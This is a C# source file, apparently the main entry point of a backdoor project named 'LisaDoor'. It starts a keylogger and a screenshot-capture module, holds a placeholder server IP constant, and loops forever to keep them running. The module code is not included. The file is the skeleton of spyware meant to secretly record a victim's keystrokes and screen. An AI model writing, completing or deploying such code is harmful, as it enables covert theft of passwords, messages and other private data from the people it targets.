using LisaDoor.Modules;

namespace LisaDoor
{
    struct Consts
    {
        static public readonly string ServerIP = "127.0.0.1";

    }
    internal class Program
    {
        static void Main(string[] args)
        {
            KeyLogger logger = new();
            Screenshot screenshot = new();
            screenshot.Init();
            logger.Init();
            while (true) ;
        }
    }
}